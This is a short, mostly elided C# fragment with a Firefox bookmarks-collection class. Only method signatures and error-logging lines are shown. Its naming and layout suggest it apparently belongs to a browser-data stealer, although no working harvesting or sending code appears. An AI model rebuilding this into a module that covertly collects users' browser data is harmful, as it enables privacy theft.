...
namespace spasibozapas.Firefox
{
    internal class cBookmarks
    {
        ...
        private static string GetBookmarksDBPath(string path)
        {
            ...
            catch (Exception ex) { deepside.Logging.Log("Firefox >> Failed to find bookmarks\n" + ex); }
            return null;
        }
        ...
        public static List<Bookmark> Get(string path)
        {
            ...
            catch (Exception ex) { deepside.Logging.Log("Firefox >> bookmarks collection failed\n" + ex); }
            return scBookmark;
        }
